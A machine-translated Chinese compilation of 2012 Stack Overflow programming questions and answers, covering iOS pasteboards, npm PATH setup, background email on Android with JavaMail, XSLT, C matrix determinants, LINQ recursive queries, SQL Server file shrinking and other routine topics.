我目前正在尝试做的基本上是我有 2 个应用程序，并根据是否安装了另一个应用程序，以某种方式运行。我发现 Pasteboard 用于应用程序间通信，所以我认为我应该使用它们。那么问题来了，两个应用程序都做这样的事情

```
UIPasteboard *pasteboard = [UIPasteboard pasteboardWithName:@"com.company.app.key" create:YES];
[pasteboard setPersistent:YES];
NSData *data = [pasteboard dataForPasteboardType:@"com.company.otherapp"];
if(data != nil)
{
     // Do stuff
}
NSData *selfKey = [pasteboard dataForPasteboardType:@"com.company.thisapp"];
if(data == nil)
{
     [pasteboard setValue:@"string" forPasteboardType:@"com.company.thisapp"];
} 
```

所以我安装了一个应用程序并运行另一个应用程序，第一次工作时，数据不是零，如果我使用带有 NSData 的 NSString 初始化程序将 NSData 转换为 NSString，我会读取“字符串”。

问题是我所做的只是关闭第二个应用程序，再次运行它，突然数据为零。我一开始以为我访问后粘贴板只是删除它，所以我在 // Do stuff 中添加了以下行

```
[pasteboard setValue@"string" forPasteboardType:@"com.company.otherapp"]; 
```

如果我第二次运行该应用程序，则没有数据仍然为零。我需要字符串永远留在粘贴板中，因为我必须告诉我是否安装了我的其他应用程序，所以有人知道为什么数据仅在 1 次运行后返回 nil 吗？

我必须注意，我所做的只是按下主页按钮，然后再次运行应用程序，所以情况是

-运行应用程序1

- 运行 app2（从粘贴板获取数据）

- 按主页按钮

- 运行 app2（数据现在为零）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T19:42:12.803

所以我想通了为什么 app2 再也看不到它了。setValue:forPasteboardType 的作用是覆盖粘贴板中的第一项。所以每次我运行我的应用程序时，它们都会在粘贴板中覆盖彼此的键。

解决方案是使用类的多个粘贴板项来搜索粘贴板类型的索引并从中获取数据。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-17T15:23:59.667

加载粘贴板时，应将其设置为持久。在上面代码的第一行之后，添加：

```
pasteboard.persistent = YES; 
```

# node.js - 咕噜不工作：-bash：执行：咕噜：未找到

> ID：13429824
> 
> 赞同：4
> 
> 时间：2012-11-17T10:50:03.380
> 
> 标签：node.js, gruntjs

我在 Mac OS 10.7.5 上安装了节点 v0.8.14。然后我用`npm install -g grunt`.

Node 可以完美运行，而 Grunt 则不行。它一直在说：**`-bash: exec: grunt: not found`**

**知道我错过了什么吗？**

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-17T11:25:47.710

默认情况下，npm 安装到 /usr/local。`/usr/local/bin/grunt`在你的外壳中尝试。为了让您简单地键入`grunt`，添加

```
export PATH="$PATH:/usr/local/bin" 
```

到`~/.profile`文件。

# android - 直接从 Android 应用程序发送电子邮件

> ID：13429828
> 
> 赞同：0
> 
> 时间：2012-11-17T10:50:43.113
> 
> 标签：android

我正在创建一个需要将电子邮件发送到特定邮件 ID 的 android 应用程序。我尝试使用意图（ACTION_SEND）。由于它需要用户交互，我没有使用这种方法。我想要的是通过后端发送电子邮件（在用户不知情的情况下）。谁能告诉我最合适的方式？提前致谢...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T10:58:29.013

互联网上有一些关于此的教程，这里有一个 -

*   [http://macmaker.blogspot.co.uk/2012/04/send-emails-in-background-in.html](http://macmaker.blogspot.co.uk/2012/04/send-emails-in-background-in.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-17T11:03:24.587

使用此类发送电子邮件。使用用户名和密码作为参数创建此类的对象。

```
public class MailSender {
private String mailhost = "smtp.gmail.com";
private String user;
private String password;
private Session session;
private Multipart _multipart;
public BodyPart messageBodyPart;
DataSource source;
static {
    Security.addProvider(new com.PackageName.JSSEProvider());
}

public MailSender(String user, String password) {
    this.user = user;
    this.password = password;

    Properties props = new Properties();
    props.setProperty("mail.transport.protocol", "smtp");
    props.setProperty("mail.smtp.host", mailhost);
    props.put("mail.smtp.auth", "true");
    props.put("mail.smtp.port", "465");
    props.put("mail.smtp.socketFactory.port", "465");
    props.put("mail.smtp.socketFactory.class",
            "javax.net.ssl.SSLSocketFactory");
    props.put("mail.smtp.socketFactory.fallback", "false");
    props.setProperty("mail.smtp.quitwait", "false");
    _multipart = new MimeMultipart();
    session = Session.getInstance(props, new MailAuthenticator(user,
            password));

}

public synchronized void sendMail(final String subject, final String uuid,
        final String address, final double latitude,
        final double longitude, final String recipients,
        final String filepath, final Context context, final int i, final int j)
        throws Exception {

    Thread thread = new Thread() {
        public void run() {
            Looper.prepare();
            try {
                System.out.println("SENDING       MAIL");
                Message message = new MimeMessage(session);
                messageBodyPart = new MimeBodyPart();
                DatabaseAdapter db = new DatabaseAdapter(context);
                String eId = db.getYourId();
                message.setFrom(new InternetAddress(eId));
                message.setSubject(subject);
                SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd");
                String currentDate = sdf.format(new Date());
                SimpleDateFormat sTf = new SimpleDateFormat("hh:mm:ss");
                String currentTime = sTf.format(new Date());
                System.out.println(i);
                messageBodyPart
                        .setText("Someone tried to unlock your device(ID : "+uuid+" ) at: "
                                + currentTime + " on " + currentDate + "\n"
                                + "Device Location : " + address + "\n"
                                + "Map: " + "http://maps.google.com/?q="
                                + latitude + "," + longitude);
                if (recipients.indexOf(',') > 0)
                    message.setRecipients(Message.RecipientType.TO,
                            InternetAddress.parse(recipients));
                else
                    message.setRecipient(Message.RecipientType.TO,
                            new InternetAddress(recipients));

                Transport transport = session.getTransport("smtp");
                System.out.println("CONECTING.....");
                transport.connect(mailhost, user, password);
                message.saveChanges();
                message.setContent(_multipart);
                _multipart.addBodyPart(messageBodyPart);
                message.setContent(_multipart);
                if (source != null) {

                    message.setFileName("image");
                }
                Transport.send(message);
                System.out.println("Mail  sent ...");

                }

                transport.close();

            } catch (Exception e) {
                e.printStackTrace();
            }

        }
    };
    thread.start();

}

public void addAttachment(String filename) throws Exception {
    if (!filename.equals("")) {
        System.out.println("Ataching     file        :)");
        messageBodyPart = new MimeBodyPart();
        source = new FileDataSource(filename);
        messageBodyPart.setDataHandler(new DataHandler(source));
        messageBodyPart.setFileName(filename);
        _multipart.addBodyPart(messageBodyPart);
        System.out.println("FILE    ATTACHED        :)");
    }
}

class MailAuthenticator extends Authenticator {
    String us;
    String pw;

    public MailAuthenticator(String username, String password) {
        super();
        this.us = username;
        this.pw = password;
    }

    public PasswordAuthentication getPasswordAuthentication() {
        return new PasswordAuthentication(us, pw);
    }
} 
```

}

还要将此添加到其他文件中。

```
public final class JSSEProvider extends Provider {
private static final long serialVersionUID = 1L;

public JSSEProvider() {
    super("HarmonyJSSE", 1.0, "Harmony JSSE Provider");
    AccessController
            .doPrivileged(new java.security.PrivilegedAction<Void>() {
                public Void run() {
                    put("SSLContext.TLS",
                            "org.apache.harmony.xnet.provider.jsse.SSLContextImpl");
                    put("Alg.Alias.SSLContext.TLSv1", "TLS");
                    put("KeyManagerFactory.X509",
                            "org.apache.harmony.xnet.provider.jsse.KeyManagerFactoryImpl");
                    put("TrustManagerFactory.X509",
                            "org.apache.harmony.xnet.provider.jsse.TrustManagerFactoryImpl");
                    return null;
                }
            });
} 
```

}

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-17T10:57:08.797

```
Intent emailIntent = new Intent(Intent.ACTION_SEND);
emailIntent.putExtra(Intent.EXTRA_EMAIL, new String[]{"test@test.com"});
emailIntent.putExtra(Intent.EXTRA_SUBJECT, "Email subject");
emailIntent.putExtra(Intent.EXTRA_TEXT, "Message body");
emailIntent.setType("application/octet-stream");
startActivity(emailIntent); 
```

您也可以使用 HTTP POST 并在服务器端编写特定方法。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-17T10:57:24.630

您可以将 Java Mail API 用于特定的电子邮件 ID。你可以修复它。[看这个链接](https://stackoverflow.com/questions/2020088/sending-email-in-android-using-javamail-api-without-using-the-default-built-in-a/2033124#2033124)！

# xslt-2.0 - 运行 XSL 时出现可恢复的错误

> ID：13429829
> 
> 赞同：-1
> 
> 时间：2012-11-17T10:50:56.970
> 
> 标签：xslt-2.0

**XSL：**

```
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:ve="http://schemas.openxmlformats.org/markup-compatibility/2006" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:m="http://schemas.openxmlformats.org/officeDocument/2006/math" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing" xmlns:w10="urn:schemas-microsoft-com:office:word" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:wne="http://schemas.microsoft.com/office/word/2006/wordml" exclude-result-prefixes="wp wne w10 w ve o r m v"  version="2.0">

<xsl:output method="text"/>
<xsl:param name="styleName"/>
<xsl:template match="w:p">
  <xsl:apply-templates/><xsl:text>&#10;</xsl:text>
</xsl:template>

<xsl:template match="w:r[not  
             ((parent::w:hyperlink[@w:anchor[matches(.,concat('^(',$styleName,')')),'i']]))]"> 
  <xsl:value-of select="replace(., '.', '&#xFF00;')"/>
</xsl:template>
</xsl:stylesheet> 
```

在处理上述 XSL 时，我收到以下错误，

**可恢复的错误：**

```
Recoverable error on line 11 
  FORG0006: An error occurred matching pattern {w:r[not               
  ((parent::w:hyperlink[@w:anchor[matches(.,concat('^(',$styleName,')')),'i']]))]}:
  Effective boolean value is not defined for a sequence of two or more items starting with a boolean 
```

请帮忙。我无法弄清楚这一点。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-19T08:47:05.693

问题在于 'i' [添加修饰符以执行不区分大小写的搜索]，它是在 matches() 方法之后指定的。

# codeigniter - CI Bonfire：无法调用模型上的方法

> ID：13429830
> 
> 赞同：0
> 
> 时间：2012-11-17T10:51:06.173
> 
> 标签：codeigniter

我是BF的新手。我正在按照这里的教程学习 BF，但我无法弄清楚为什么它一直提示我错误消息如下：

> *致命错误：在 ... 中的非对象上调用成员函数 where()*

这是代码：

```
class Content extends Admin_Controller {

public function __construct(){
    parent::__construct();
    Template::set('toolbar_title', 'Manage Your Blog');
}

public function index(){
    $posts = $this->post_model->where('deleted', 0)->find_all();
    Template::set('posts', $posts);
    Template::render();
}
} 
```

有人可以指导我吗？谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T07:35:28.317

bborisovs 是对的，您需要在构造函数中加载模型，然后才能使用对象：

$this->load->model('post_model', null, true);

还要确保您的模型存在。

# c - NxN 矩阵行列式递归问题

> ID：13429832
> 
> 赞同：1
> 
> 时间：2012-11-17T10:51:17.910
> 
> 标签：c, math, recursion, matrix

我目前正在尝试编写一个程序来查找 NxN 矩阵的行列式，但我遇到了 N 大于 2 的递归问题。基本上据我所知，它没有这样做，它只是运行一次函数我的调试选项显示该函数通过列运行，但顺序永远不会下降，然后无论如何它都会给我的行列式为零。我试过到处寻找关于我做错了什么的任何想法，但我似乎找不到任何答案，我什至找到了与我做基本相同事情的例子，并且无论如何使用它们都会给我零，所以我很疑惑在这里）

代码：

```
#include<stdlib.h>
#include<stdio.h>
#include<math.h>

double det(double **mat, int order);

int main (int argc, char* argv[])
{  

   FILE* input; 
   int row,column,N;
   double **matrix;
   N=3;
   matrix=(double**)malloc(N*sizeof(double));

   input=fopen("matrix.dat", "r");
   if(input !=(FILE*) NULL)
   {

      for(row=0; row<N; row++) 
      { 
     matrix[row]=(double*)malloc(N*sizeof(double));
  }
  for(row=0; row<N; row++) 
  {
        printf("| ");
        for(column=0; column<N; column++)   
        {  
          fscanf(input,"%lf ", &matrix[row][column]); 
      printf("%g ", matrix[row][column]);
    }
     if(row != (N/2))
         { 
       printf("|\n");
         }
         else
         {

           printf("|= %lf \n", det(matrix, N) );
     }
 }
 return(EXIT_SUCCESS);
 }

 else
 { 
  printf("*********************ERROR*********************\n");
  printf("** Cannot open input file 'matrix.dat' make  **\n");
  printf("** sure file is present in working directory **\n");
  printf("***********************************************\n");

  return(EXIT_FAILURE);
 }

}

double det(double **mat, int order)
{
 int debug;
 double cofact[order], determinant, **temp;
 determinant = 0;
 debug=0;

 if(order==1)
 {
  determinant=mat[0][0];

  if(debug==1)
  {
    printf("order 1 if\n");
  }
 }
  else if(order==2)
 {
 determinant= ((mat[0][0]*mat[1][1])-(mat[0][1]*mat[1][0]));

 if(debug==1)
 {
   printf("order 2 if\n");
     }
  }
 else
 {

  int column, rowtemp, coltemp, colread;
  for (column=0; column<order; column++) 
  {
  /* Now create an array of size N-1 to store temporary data used for calculating minors */
     temp= malloc((order-1)*sizeof(*temp)); 
    for(rowtemp=0; rowtemp<(order-1); rowtemp++)
  {
    /* Now asign each element in the array temp as an array of size N-1 itself */
    temp[rowtemp]=malloc((order-1)*sizeof(double));
  }
  for(rowtemp=1; rowtemp<order; rowtemp++)
  {
    /* We now have our empty array, and will now fill it by assinging row and collumn values    from the original mat with the aprroriate elements excluded */
       coltemp=0;
      for(colread=0; colread<order; colread++)
      {
        /* When the collumn of temp is equal to the collumn of the matrix, this indicates this row should be exlcuded and is skiped over */
        if(colread==column)
        {
          continue;
        }
        temp[rowtemp-1][coltemp] = mat[rowtemp][colread];
        coltemp++;
      }

   }
  if(debug==1)
  {
    printf("column =%d, order=%d\n", column, order);
  }
  determinant+=(mat[0][column]*(1 - 2*(column & 1))*det(temp, order-1));
}   

 }  
 return(determinant);   

 } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-17T12:50:48.930

```
temp= (double **)malloc((order-1)*sizeof(double)); 
```

只要`sizeof(double*) <= sizeof(double)`，这不会导致崩溃，通常的 32 或 64 位系统就是这种情况，但它在概念上是错误的。您正在为 的数组分配空间`double*`，因此该因子应该是`sizeof(double*)`or，更好，因为它在类型更改时是不变的，`sizeof *temp`,

```
temp = malloc((order-1) * sizeof *temp); 
```

（而且您不需要`malloc`在 C 中转换结果，最好不要，因为转换可能会隐藏错误，例如忘记`#include <stdlib.h>`.）

分配也一样

```
matrix=(double**)malloc(N*sizeof(double)); 
```

在`main`.

在行列式的计算中，

```
 for(coltemp=0; coltemp<order; coltemp++)
         {
           for(colread=0; colread<order; colread++)
               {
               /* When the collumn of temp is equal to the collumn of   the matrix, this indicates this row should be exlcuded and is skiped over */
               if(colread==column)
               {
                continue;
               }
          temp[rowtemp-1][coltemp] = mat[rowtemp][colread];
          coltemp++;
            }
        } 
```

您在列中循环两次，一次 for `coltemp == 0`，然后在内部循环中，`coltemp`递增`order-1`次数，因此内部循环`coltemp == order-1`在开始时第二次运行。然后`coltemp`在循环中再次递增多次，并且您正在写入超出分配内存的范围。

应该删除外循环，`coltemp = 0;`而内循环是您所需要的。

```
pow(-1,column)) 
```

不是确定标志的好方法。

```
(1 - 2*(column & 1)) 
```

比调用`pow`.

最后，在`main`

```
for(row=0; row<N; row++) 
 {
    printf("| ");
    for(column=0; column<N; column++)   
    { 
          fscanf(input,"%lf ", &matrix[row][column]); 
          printf("%g ", matrix[row][column]);
    }
    if(row != (N/2))
    { 
    printf("|\n");
    }
    else
    {

            printf("|= %lf \n", det(matrix, N) );
    }
 } 
```

您正在打印行列式`N/2`，这看起来不错，但当时您尚未扫描整个矩阵，因此行`N/2 + 1`包含`N-1`未初始化的数据，这不太可能全为零。如果将 更改`if (row != N/2)`为`if (row != N-1)`，它将起作用，但是，处理它的正确方法是将矩阵的扫描与计算和打印分开。这些都是应该在各自独立的函数中处理的独立操作。

# objective-c - iPhone应用程序中的小数到分数转换

> ID：13429838
> 
> 赞同：0
> 
> 时间：2012-11-17T10:52:01.973
> 
> 标签：objective-c, ios

> **可能重复：**
> [在Objective-C中将小数转换为分数？](https://stackoverflow.com/questions/5552537/convert-decimal-to-fraction-in-objective-c)

我正在尝试制作一个简单的应用程序来将十进制形式转换为分数形式。十进制值设置为 UISlider 的值，但我应该如何获得分数形式的分数？我应该用 double 还是 float 声明它，我应该如何告诉应用程序以分数形式打印出来？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T11:45:56.730

您想从实数返回小数近似值吗？例如 0.3333 ~ "1/3"。你可以试试这个：

```
#import <Foundation/Foundation.h>

char out[20];

static char *fractApprox(double r, long d) {
    double atof();
    int atoi();
    void exit();

    long m[2][2];
    double x, startx;
    long maxden;
    long ai;

    startx = x = r;
    maxden = d;

    /* initialize matrix */
    m[0][0] = m[1][1] = 1;
    m[0][1] = m[1][0] = 0;

    /* loop finding terms until denom gets too big */
    while (m[1][0] *  ( ai = (long)x ) + m[1][1] <= maxden) {
        long t;
        t = m[0][0] * ai + m[0][1];
        m[0][1] = m[0][0];
        m[0][0] = t;
        t = m[1][0] * ai + m[1][1];
        m[1][1] = m[1][0];
        m[1][0] = t;
        if(x==(double)ai) break;     // AF: division by zero
        x = 1/(x - (double) ai);
        if(x>(double)0x7FFFFFFF) break;  // AF: representation failure
    }

    ai = (maxden - m[1][1]) / m[1][0];
    m[0][0] = m[0][0] * ai + m[0][1];
    m[1][0] = m[1][0] * ai + m[1][1];

    sprintf(out, "%ld/%ld",m[0][0],m[1][0]);
    return out;
}

int main(int argc, const char * argv[])
{

    @autoreleasepool {
        printf("%s",fractApprox(0.342343, 999));
    }
    return 0;
} 
```

打印`329/961`到控制台。

感谢加州大学欧文分校的 David Eppstein[的 C 算法](http://www.ics.uci.edu/~eppstein/numth/frap.c)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-17T11:50:32.507

将小数转换为小数所需的是[GCD](http://en.wikipedia.org/wiki/Greatest_common_divisor)。例如：0.535

1.  0.535 => 535/1000
2.  GCD(535, 1000) => 5
3.  (535/5) / (1000/5) => 107/200。

# ruby-on-rails - 是否可以对模型类中的多个属性进行全局验证？

> ID：13429840
> 
> 赞同：0
> 
> 时间：2012-11-17T10:52:12.007
> 
> 标签：ruby-on-rails, ruby

让我们以这个示例模型为例：

```
class Address < ActiveRecord::Base
  attr_accessible :city, :postcode, :street, :number
  validates :city, presence: true, size: {minimum: 2}
  validates :postcode, presence: true
  validates :street, presence: true 
  validates :number, presence: true  
end 
```

我是否必须单独对每个属性进行所有验证？这里的所有属性都有一个共同的验证`presence: true`。我不能写类似的东西`validates * , presence: true`

希望你明白我的意思。应该有一个解决方案，因为 rails 和 ruby​​ 经常谈论 DRY 方式...... :)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T10:54:39.173

```
validates_presence_of :city, :street, :postcode, :number 
```

# vxworks - 标识符“taskRtpLock”未定义

> ID：13429843
> 
> 赞同：0
> 
> 时间：2012-11-17T10:52:27.840
> 
> 标签：vxworks

我已经包含`taskLib.h`并且我正在调用`taskRtpLock()`
默认构建规范：`SIMLINUXdiab`
活动构建规范：`SIMLINUXdiab`

`Error: identifier "taskRtpLock" is undefined`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T21:42:48.493

有两个文件名为`taskLib.h`：一个位于`$(TGT_DIR)/h/`，另一个位于`$(TGT_DIR)/usr/h`. 第一个用于内核任务，第二个用于实时进程。猜测出于某种原因，第一个包含在您的案例中。

但我不太确定实际原因，因为现在我没有来源可以检查它。无论如何，请确保使用以下命令将 RTP 组件添加到项目中：

```
$ cd /path/to/WindRiver/
$ wrenv -p vxworks-6.5
$ cd path/to/your/project
$ vxprj bundle add projectFile.wpj BUNDLE_RTP_DEVELOP 
```

# sequence - 如何在不使用映射变量和序列生成器的情况下创建序列？

> ID：13429845
> 
> 赞同：0
> 
> 时间：2012-11-17T10:52:29.947
> 
> 标签：sequence, informatica-powercenter, informatica

我有一个场景，我必须在不使用序列转换的情况下生成序列

我可以使用映射变量来做同样的事情，比如使用`setcountvariable()`它工作的选项，但是否有任何其他解决方案。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2016-02-10T09:17:01.133

您在这里使用的未连接查找仅用于从目标表中获取序列的计数或最大值。我们也可以通过使用存储过程转换来实现这一点。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-12-31T12:36:42.650

1.  **使用未连接的查找和表达式转换**
2.  **创建未连接的查找以从目标获取最大序列值，因为您必须覆盖一个查询，该查询将为您提供最大值**
3.  **将该最大值端口返回到表达式转换**
4.  **现在创建一个增量为 1 的变量端口并添加最大值，它将为传递到目标表的每条记录创建序列值**

# php - PHP + JS：确定图像文件的尺寸

> ID：13429850
> 
> 赞同：-2
> 
> 时间：2012-11-17T10:53:02.380
> 
> 标签：php, jquery, image, png, jpeg

如何在不打开 .jpeg 或 .png 文件的情况下判断其尺寸？

如果无法确定尺寸，如何自动裁剪图像？

我正在使用 PHP 和 JS。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T11:12:59.443

```
list($width, $height) = getimagesize("img.jpg");
      or

$im=imagecreatefromjpeg("image_testin_1.JPG");
imagetruecolortopalette($im, false, 255);

$w = imagesx($im);//provide width of full page
$h = imagesy($im);//provide height of full page 
```

# sql-server-2005 - 截断表后的可用空间

> ID：13429853
> 
> 赞同：0
> 
> 时间：2012-11-17T10:53:13.253
> 
> 标签：sql-server-2005

> **可能重复：**
> [永久删除表时回收 SQL Server 2005 数据库中的空间](https://stackoverflow.com/questions/6158324/reclaim-space-in-sql-server-2005-database-when-dropping-tables-permanently)

我有一个需要 20GB 的表并且不需要它，但是使用 DELETE 语句不是一个选项，因为它会导致 LDF 文件由于记录删除的每个行条目而迅速增长。

所以我使用了 TRUNCATE TABLE，尽管我已经删除了这个表，但现在数据库仍然占用相同数量的空间。我在某处读过我应该使用收缩数据库选项，但问题是他们说它应该删除数据库中的所有索引？

你会推荐做什么？有没有其他方法可以从 MDF 文件中释放这个未分配的空间？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T11:02:18.310

您可以改用收缩文件

[来自MSDN](http://msdn.microsoft.com/en-us/library/ms189493.aspx)的语法

```
DBCC SHRINKFILE 
(
    { file_name | file_id } 
    { [ , EMPTYFILE ] 
    | [ [ , target_size ] [ , { NOTRUNCATE | TRUNCATEONLY } ] ]
    }
)
[ WITH NO_INFOMSGS ] 
```

> 缩小当前数据库的指定数据或日志文件的大小，或者通过将数据从指定文件移动到同一文件组中的其他文件来清空文件，从而允许从数据库中删除该文件。您可以将文件缩小到小于创建时指定的大小。这会将最小文件大小重置为新值。

**例子**

```
/* change into your database */
USE dbName
/* determine the logical file name */
EXEC sp_helpfile
GO
/* shrink the file */
DBCC SHRINKFILE (logicalLogFileName)
GO 
```

# c# - 如何制定 IQueryable 来查询递归数据库表？

> ID：13429855
> 
> 赞同：5
> 
> 时间：2012-11-17T10:53:54.703
> 
> 标签：c#, linq-to-sql, iqueryable

我有一个这样的数据库表：

```
Entity
---------------------
ID        int      PK
ParentID  int      FK
Code      varchar
Text      text 
```

该`ParentID`字段是同一个表中的另一个记录的外键（递归）。所以这个结构代表一棵树。

我正在尝试编写一种方法来查询此表并根据路径获取 1 个特定实体。路径将是一个字符串，表示`Code`实体和父实体的属性。因此，一个示例路径将是`"foo/bar/baz"`指一个特定实体，其`Code == "baz"`、父`Code == "bar"`级和父级 的父级`Code == "foo"`。

我的尝试：

```
public Entity Single(string path)
{
 string[] pathParts = path.Split('/');
 string code = pathParts[pathParts.Length -1];

 if (pathParts.Length == 1)
  return dataContext.Entities.Single(e => e.Code == code && e.ParentID == 0);

 IQueryable<Entity> entities = dataContext.Entities.Where(e => e.Code == code);
 for (int i = pathParts.Length - 2; i >= 0; i--)
 {
  string parentCode = pathParts[i];
  entities = entities.Where(e => e.Entity1.Code == parentCode); // incorrect
 }

 return entities.Single();
} 
```

我知道这是不正确的，因为循环`Where`内部只是为**当前 Entity**而不是**父 Entity**`for`添加了更多条件，但是我该如何纠正呢？换句话说，我希望 for 循环说“并且父代码必须是 x，并且该父代码的父代码必须是 y，并且该父代码的父代码必须是 z .... 等等”。除此之外，出于性能原因，我希望它是一个 IQueryable，因此只有 1 个查询进入数据库。

 ***** * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-27T12:15:30.510

> 如何制定 IQueryable 来查询递归数据库表？我希望它是一个 IQueryable，因此只有 1 个查询进入数据库。

~~我认为实体框架目前无法使用单个翻译查询遍历分层表。原因是您需要实现循环或递归，据我所知，两者都不能转换为 EF 对象存储查询。~~

**更新**

@Bazzz 和 @Steven 让我思考，我不得不承认我完全错了：`IQueryable`动态地为这些需求构建一个是可能的，而且非常容易。

可以递归调用以下函数来构建查询：

```
public static IQueryable<TestTree> Traverse(this IQueryable<TestTree> source, IQueryable<TestTree> table, LinkedList<string> parts)
{
    var code = parts.First.Value;
    var query = source.SelectMany(r1 => table.Where(r2 => r2.Code == code && r2.ParentID == r1.ID), (r1, r2) => r2);
    if (parts.Count == 1)
    {
        return query;
    }
    parts.RemoveFirst();
    return query.Traverse(table, parts);
} 
```

根查询是一种特殊情况；这是一个调用的工作示例`Traverse`：

```
using (var context = new TestDBEntities())
{
    var path = "foo/bar/baz";
    var parts = new LinkedList<string>(path.Split('/'));
    var table = context.TestTrees;

    var code = parts.First.Value;
    var root = table.Where(r1 => r1.Code == code && !r1.ParentID.HasValue);
    parts.RemoveFirst();

    foreach (var q in root.Traverse(table, parts))
        Console.WriteLine("{0} {1} {2}", q.ID, q.ParentID, q.Code);
} 
```

使用此生成的代码仅查询数据库一次：

```
exec sp_executesql N'SELECT 
[Extent3].[ID] AS [ID], 
[Extent3].[ParentID] AS [ParentID], 
[Extent3].[Code] AS [Code]
FROM   [dbo].[TestTree] AS [Extent1]
INNER JOIN [dbo].[TestTree] AS [Extent2] ON ([Extent2].[Code] = @p__linq__1) AND ([Extent2].[ParentID] = [Extent1].[ID])
INNER JOIN [dbo].[TestTree] AS [Extent3] ON ([Extent3].[Code] = @p__linq__2) AND ([Extent3].[ParentID] = [Extent2].[ID])
WHERE ([Extent1].[Code] = @p__linq__0) AND ([Extent1].[ParentID] IS NULL)',N'@p__linq__1 nvarchar(4000),@p__linq__2 nvarchar(4000),@p__linq__0 nvarchar(4000)',@p__linq__1=N'bar',@p__linq__2=N'baz',@p__linq__0=N'foo' 
```

虽然我更喜欢原始查询的执行计划（见下文），但该方法是有效的并且可能有用。

**更新结束**

**使用 IEnumerable**

这个想法是一次性从表中获取相关数据，然后使用 LINQ to Objects 在应用程序中进行遍历。

这是一个将从序列中获取节点的递归函数：

```
static TestTree GetNode(this IEnumerable<TestTree> table, string[] parts, int index, int? parentID)
{
    var q = table
        .Where(r => 
             r.Code == parts[index] && 
             (r.ParentID.HasValue ? r.ParentID == parentID : parentID == null))
        .Single();
    return index < parts.Length - 1 ? table.GetNode(parts, index + 1, q.ID) : q;
} 
```

你可以这样使用：

```
using (var context = new TestDBEntities())
{
    var path = "foo/bar/baz";
    var q = context.TestTrees.GetNode(path.Split('/'), 0, null);
    Console.WriteLine("{0} {1} {2}", q.ID, q.ParentID, q.Code);
} 
```

这将为每个路径部分执行一个 DB 查询，因此如果您希望 DB 只被查询一次，请改用它：

```
using (var context = new TestDBEntities())
{
    var path = "foo/bar/baz";
    var q = context.TestTrees
        .ToList()
        .GetNode(path.Split('/'), 0, null);
    Console.WriteLine("{0} {1} {2}", q.ID, q.ParentID, q.Code);
} 
```

一个明显的优化是在遍历之前排除我们路径中不存在的代码：

```
using (var context = new TestDBEntities())
{
    var path = "foo/bar/baz";
    var parts = path.Split('/');
    var q = context
        .TestTrees
        .Where(r => parts.Any(p => p == r.Code))
        .ToList()
        .GetNode(parts, 0, null);
    Console.WriteLine("{0} {1} {2}", q.ID, q.ParentID, q.Code);
} 
```

除非您的大多数实体具有相似的代码，否则此查询应该足够快。但是，如果您绝对需要最佳性能，则可以使用原始查询。

**SQL Server 原始查询**

对于 SQL Server，基于 CTE 的查询可能是最好的：

```
using (var context = new TestDBEntities())
{
    var path = "foo/bar/baz";
    var q = context.Database.SqlQuery<TestTree>(@"
        WITH Tree(ID, ParentID, Code, TreePath) AS
        (
            SELECT ID, ParentID, Code, CAST(Code AS nvarchar(512)) AS TreePath
            FROM dbo.TestTree
            WHERE ParentID IS NULL

            UNION ALL

            SELECT TestTree.ID, TestTree.ParentID, TestTree.Code, CAST(TreePath + '/' + TestTree.Code AS nvarchar(512))
            FROM dbo.TestTree
            INNER JOIN Tree ON Tree.ID = TestTree.ParentID
        )
        SELECT * FROM Tree WHERE TreePath = @path", new SqlParameter("path", path)).Single();
    Console.WriteLine("{0} {1} {2}", q.ID, q.ParentID, q.Code);
} 
```

通过根节点限制数据很容易，并且在性能方面可能非常有用：

```
using (var context = new TestDBEntities())
{
    var path = "foo/bar/baz";
    var q = context.Database.SqlQuery<TestTree>(@"
        WITH Tree(ID, ParentID, Code, TreePath) AS
        (
            SELECT ID, ParentID, Code, CAST(Code AS nvarchar(512)) AS TreePath
            FROM dbo.TestTree
            WHERE ParentID IS NULL AND Code = @parentCode

            UNION ALL

            SELECT TestTree.ID, TestTree.ParentID, TestTree.Code, CAST(TreePath + '/' + TestTree.Code AS nvarchar(512))
            FROM dbo.TestTree
            INNER JOIN Tree ON Tree.ID = TestTree.ParentID
        )
        SELECT * FROM Tree WHERE TreePath = @path", 
            new SqlParameter("path", path),
            new SqlParameter("parentCode", path.Split('/')[0]))
            .Single();
    Console.WriteLine("{0} {1} {2}", q.ID, q.ParentID, q.Code);
} 
```

**脚注**

所有这些都使用 .NET 4.5、EF 5、SQL Server 2012 进行了测试。数据设置脚本：

```
CREATE TABLE dbo.TestTree
(
    ID int not null IDENTITY PRIMARY KEY,
    ParentID int null REFERENCES dbo.TestTree (ID),
    Code nvarchar(100)
)
GO

INSERT dbo.TestTree (ParentID, Code) VALUES (null, 'foo')
INSERT dbo.TestTree (ParentID, Code) VALUES (1, 'bar')
INSERT dbo.TestTree (ParentID, Code) VALUES (2, 'baz')
